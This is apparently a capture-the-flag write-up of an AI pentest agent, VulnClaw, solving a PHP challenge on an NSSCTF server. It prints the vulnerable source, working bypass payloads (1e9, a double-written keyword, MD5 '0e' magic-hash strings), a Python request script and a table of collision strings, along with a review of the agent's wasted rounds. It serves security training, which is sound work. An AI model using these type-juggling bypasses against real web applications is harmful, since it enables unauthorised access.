# stage: exploit
# category: warstories

# 🦞 War Story #002 — NSSCTF PHP Weak Comparison + preg_replace Double-Write + MD5 Weak Comparison

## Metadata

| Field | Value |
|------|------|
| **Date** | 2026-04-19 |
| **Target** | `http://node5.anna.nssctf.cn:29058/` |
| **Challenge Type** | Web — PHP weak comparison / preg_replace double-write bypass / MD5 weak comparison collision |
| **Keywords** | PHP, weak comparison, array bypass, double-write bypass, MD5 0e collision, scientific notation |
| **VulnClaw Rounds** | 61 (~52 effective solving rounds, including 9 rounds of redundant verification) |
| **MCP Tools** | fetch, python_execute |
| **Correct Flag** | `NSSCTF{4dd0e8c8-d64c-4fe9-90a7-6944df79a1f2}` |

---

## Attack Chain (Complete Real Process)

| Step | Action | Finding/Issue |
|------|------|-----------|
| 1 | First autonomous pentest launch | **Tool call parameter error** — Round 2 failed with 400 due to malformed function arguments JSON |
| 2 | Restart | fetch retrieved the `highlight_file` source, but HTML syntax-highlighting tags made it hard to read |
| 3 | Initial source analysis | Identified a three-gate structure: L1 (num weak comparison) / L2 (str preg_replace) / L3 (md5 weak comparison) |
| 4 | Try L1: `num=1e9` | ✅ Correct! Scientific notation bypasses strlen≤3 + numeric value >999999999 |
| 5 | Try L2: `str=NSSNSSCTFCTF` | ✅ Double-write bypass! The earlier P0 fix paid off — the double-write bypass knowledge was applied immediately |
| 6 | Analyze the L3 condition | `md5(md5_1)==md5(md5_2)` — requires an MD5 weak comparison collision |
| 7-9 | **Repeatedly search for MD5 collision values** | Confused search direction: first looked for "double MD5 collision" → then "0e-prefix collisions" → brute-force search → multiple timeouts |
| 10 | Use python_execute to brute-force md5 values starting with 0e | Found `100523`/`100662` etc., but the md5 values contain non-digit characters (e.g. `0e993d...`) |
| 11 | Send L3: `md5_1=100523&md5_2=100662` | ❌ Returns `G100523\n100662` — **md5 comparison failed!** |
| 12 | Analyze the misjudgment | md5 values like `0e993dffb...` contain letters `d`/`f`; PHP does not treat them as scientific notation |
| 13-20 | **Keep searching for correct collision values** | Tried web search, Python brute force, known collision pairs — multiple timeouts / no results |
| 21-24 | Try a PHP array bypass for L3 | `md5_1[]=1&md5_2[]=2` — `md5([])` returns NULL → `Nice!X(` — is_string check fails |
| 25-33 | **Continue searching for usable string collisions** | Broadened the search, but still no md5 collision in pure `0e[0-9]+` format found |
| 34 | Use python_execute to build the complete request | `Nice!yoxi!` appeared at the same time — confirmed the md5 collision values are valid, but session management was problematic |
| 35-40 | **Session management chaos period** | Tried requests.Session / step-by-step requests / single combined request — repeatedly verified the flag |
| 41 | Found the correct collision values | `QNKCDZO` (md5=0e830400...) and `s878926199a` (md5=0e545993...) — **pure 0e+digits format** |
| 42-48 | Build the complete request and verify | Used a Python session to manage cookies correctly, successfully obtained the flag |
| 49-61 | **Redundant verification period** | Re-sent the request multiple times to confirm the flag — 9 rounds of redundant verification |

---

## Source Code Analysis

### Complete Source Code

```php
<?php
session_start();
highlight_file(__FILE__);
if(isset($_GET['num'])){
    if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
        echo ":D";
        $_SESSION['L1'] = 1;
    }else{ echo ":C"; }
}
if(isset($_GET['str'])){
    $str = preg_replace('/NSSCTF/',"",$_GET['str']);
    if($str === "NSSCTF"){
        echo "wow";
        $_SESSION['L2'] = 1;
    }else{ echo $str; }
}
if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
    if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
        echo "Nice!";
        if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
            if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                echo "yoxi!";
                $_SESSION['L3'] = 1;
            }else{ echo "X("; }
        }
    }else{ echo "G"; }
}
if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
    include('flag.php');
    echo $flag;
}
?>
```

### Three-Gate Analysis

| Gate | Parameter | Condition | Bypass Method | Success Marker |
|------|------|------|----------|----------|
| L1 | `num` (GET) | `strlen(num)<=3 && num>999999999` | Scientific notation `1e9` | `:D` |
| L2 | `str` (GET) | `preg_replace('/NSSCTF/','',str)==="NSSCTF"` | Double-write `NSSNSSCTFCTF` | `wow` |
| L3 | `md5_1/md5_2` (POST) | `md5_1!==md5_2 && md5(md5_1)==md5(md5_2) && is_string` | 0e-prefix MD5 collision | `Nice!yoxi!` |
| Flag | — | All of `L1 && L2 && L3` set in the session | — | `NSSCTF{...}` |

---

## Correct Payloads and How They Work

### Complete Request

```python
import requests
s = requests.Session()

# Step 1: set the L1 + L2 session
r1 = s.get("http://target/?num=1e9&str=NSSNSSCTFCTF")
# r1.text contains ":Dwow"

# Step 2: trigger L3 + get the flag
r2 = s.post("http://target/", data={"md5_1": "QNKCDZO", "md5_2": "s878926199a"})
# r2.text contains "Nice!yoxi!" + flag
```

### L1: Scientific Notation Bypass

```
GET ?num=1e9
```

- `strlen("1e9")` = 3 (string length) ≤ 3 ✅
- `"1e9" > 999999999` → PHP converts `"1e9"` to `1000000000` > `999999999` ✅

### L2: preg_replace Double-Write Bypass

```
GET ?str=NSSNSSCTFCTF
```

- `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → removes the middle `NSSCTF` → `NSS` + `CTF` = `NSSCTF`
- `'NSSCTF' === 'NSSCTF'` ✅

### L3: MD5 Weak Comparison Collision

```
POST md5_1=QNKCDZO&md5_2=s878926199a
```

- `md5("QNKCDZO")` = `0e830400451993494058024219903391`
- `md5("s878926199a")` = `0e545993274517709034328855841020`
- PHP weak comparison `"0e830400..." == "0e545993..."` → both treated as scientific notation `0` → `0 == 0` = `true` ✅
- `"QNKCDZO" !== "s878926199a"` ✅
- `is_string("QNKCDZO") && is_string("s878926199a")` ✅

### ⚠️ The Key Trap of L3: Everything After 0e Must Be Digits

- ❌ `100523` → md5 = `0e993dffb88165eb32369e16dd25b536` → contains letters `d`/`f` → PHP does not treat it as scientific notation → **weak comparison fails**
- ✅ `QNKCDZO` → md5 = `0e830400451993494058024219903391` → all digits after `0e` → PHP treats it as scientific notation 0 → **weak comparison succeeds**

---

## VulnClaw Process Problem Analysis

### Efficiency Problem: Only ~15 of 61 Rounds Were Effective

| Problem Type | Wasted Rounds | Root Cause |
|----------|----------|------|
| Tool call parameter format error | 1 | JSON format issue in MCP tool call arguments |
| Wrong MD5 collision search direction | ~12 | First searched "double MD5" → then "brute-force collision" → repeated timeouts |
| Imprecise understanding of 0e collision format | ~5 | Didn't know everything after `0e` must be digits; used md5 values containing letters |
| Session management chaos | ~8 | Didn't understand that step-by-step requests must preserve cookies; kept retrying the same request |
| Redundant verification | ~9 | Sent 9 more duplicate requests to confirm after obtaining the flag |
| **Effective rounds** | **~15** | With complete knowledge and correct session handling, 5-8 rounds would suffice |

### Specific Problem List

#### 1. Imprecise MD5 Weak Comparison Knowledge (biggest source of waste)

VulnClaw knew "md5 values starting with 0e are weakly equal", but didn't know that **everything after `0e` must be digits (0-9)** for PHP to treat it as scientific notation.

- Used `100523` (md5 = `0e993d...`, contains letters d/f) → PHP does not treat it as scientific notation → weak comparison fails
- Wasted 5+ rounds on wrong collision values

**Improvement needed**: php-bypass-cheatsheet.md and WAF_BYPASS_KNOWLEDGE must clearly state that everything after `0e` must be digits

#### 2. Inefficient Collision Value Search Strategy

The search path was confused:
1. First searched for "double MD5 collision" (understood the condition as `md5(md5(x))==md5(md5(y))`) → misunderstood the condition
2. Brute-forced random numbers → the md5 values found contained letters
3. Web search → timeout

**Correct path**: The challenge condition is `md5(x) == md5(y)` (weak comparison), not double MD5. Well-known classic collision strings such as `QNKCDZO`/`240610708`/`s878926199a` should be used directly.

**Improvement needed**: Add a "standard MD5 weak comparison collision string table" (with verified values) to the ctf-web SKILL.md

#### 3. Weak Session Management Awareness

- The challenge stores L1/L2/L3 state in `$_SESSION` → cookies must be preserved
- VulnClaw tried sending all parameters in a single request → sometimes succeeded, sometimes failed
- Many rounds were wasted debugging "why didn't the flag appear"

**Improvement needed**: When code auditing encounters `$_SESSION`, automatically remind that session management (cookie persistence) is required

#### 4. Excessive Redundant Verification

After obtaining the flag, 9 more duplicate requests were sent. Verification is a good habit, but 1-2 confirmations are enough.

**Improvement needed**: After a successful flag verification, verify at most once more, then immediately [DONE]

---

## Comparison with #001: Effectiveness of the P0 Fixes

| Fix Item | #001 Performance | #002 Performance | Effect |
|--------|-----------|-----------|------|
| **P0-1: Double-write bypass** | Completely unaware | **Applied immediately** with `NSSNSSCTFCTF` | ✅ Fix effective |
| **P0-2: Output semantics** | Misjudged else-branch echo as success | Correctly identified `:D`/`wow`/`Nice!yoxi!` as success markers | ✅ Fix effective |
| Newly exposed problem | — | Imprecise understanding of the MD5 0e format | ❌ Needs fixing |
| Newly exposed problem | — | Missing session management knowledge | ❌ Needs fixing |

---

## Lessons Learned

### Core Methodology

1. **Scientific notation is the master key for PHP weak comparison bypasses** — formats like `1e9`/`9e9` satisfy both short string length and large numeric value
2. **preg_replace double-write bypass** — `first half of keyword + keyword + second half of keyword`; after replacement the parts reassemble into the original word
3. **MD5 weak comparison** — md5 values starting with `0e` followed by pure digits are treated by PHP as scientific notation 0, so they compare equal to each other
4. **⚠️ Everything after 0e must be digits** — `0e830400...` (all digits ✅) vs `0e993d...` (contains letters ❌)
5. **Session challenges require cookie management** — PHP `$_SESSION` depends on cookies; step-by-step requests are needed

### Known MD5 Weak Comparison Collision String Table (verified working)

| String | MD5 Value | Pure digits after 0e? |
|--------|--------|------------|
| `QNKCDZO` | `0e830400451993494058024219903391` | ✅ |
| `240610708` | `0e462097431906509019562988736854` | ✅ |
| `s878926199a` | `0e545993274517709034328855841020` | ✅ |
| `s155964671a` | `0e342768416822451524974117254469` | ✅ |
| `s214587387a` | `0e848204310308006290363795692068` | ✅ |
| `s1091221200a` | `0e940625744785414655937625828514` | ✅ |

### VulnClaw Capability Assessment

| Capability | Performance | Rating |
|------|------|------|
| Target recon | Quickly obtained the source code, identified the three-gate structure | ⭐⭐⭐⭐ |
| L1 weak comparison bypass | Scientific notation `1e9`, passed in 1 round | ⭐⭐⭐⭐⭐ |
| L2 double-write bypass | Applied immediately after the P0 fix | ⭐⭐⭐⭐⭐ |
| L3 MD5 collision | Confused search direction, imprecise understanding of the 0e format | ⭐⭐ |
| Session management | Many rounds wasted, didn't realize cookie persistence was needed | ⭐⭐ |
| Flag verification | Excessive verification, 9 redundant rounds | ⭐⭐⭐ |

---

## Problems To Be Fixed

| Priority | Problem | Suggested Fix |
|--------|------|----------|
| **P0** | Imprecise understanding of the MD5 0e weak comparison format | php-bypass-cheatsheet.md + WAF_BYPASS_KNOWLEDGE must clearly state that everything after `0e` must be pure digits |
| **P0** | Missing standard MD5 weak comparison collision string table | Add a verified collision table to ctf-web SKILL.md |
| **P1** | Missing session management knowledge | Automatically remind about cookie management when code auditing encounters `$_SESSION` |
| **P2** | Excessive flag verification | At most 1 confirmation after successful verification, then immediately [DONE] |

---

*VulnClaw's second battle · 2026-04-19 · 61 rounds of autonomous pentesting (~15 effective) · Double-write bypass fix effective · MD5 collision search inefficient 🦞*
